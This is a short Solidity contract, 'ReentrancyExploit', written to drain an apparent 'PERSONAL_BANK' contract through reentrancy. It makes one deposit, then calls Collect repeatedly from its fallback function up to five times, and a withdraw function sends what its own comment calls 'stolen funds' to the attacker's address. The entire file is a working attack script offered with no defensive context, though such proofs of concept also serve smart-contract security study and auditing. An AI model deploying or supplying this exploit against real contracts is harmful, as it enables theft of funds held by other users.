pragma solidity ^0.4.19;

interface IPERSONAL_BANK {
    function Deposit() external payable;
    function Collect(uint _am) external payable;
}

contract ReentrancyExploit {
    IPERSONAL_BANK public target;
    address public owner;
    uint public attackAmount = 1 ether;
    uint public reentrancyCount;

    constructor(address _target) public {
        target = IPERSONAL_BANK(_target);
        owner = msg.sender;
    }

    // Initiate deposit and attack
    function attack() public payable {
        require(msg.value >= attackAmount);
        target.Deposit.value(attackAmount)();
        target.Collect(attackAmount); // Start reentrancy
    }

    // Fallback to perform reentrancy
    function () external payable {
        if (reentrancyCount < 5) {
            reentrancyCount++;
            target.Collect(attackAmount);
        }
    }

    // Withdraw stolen funds
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

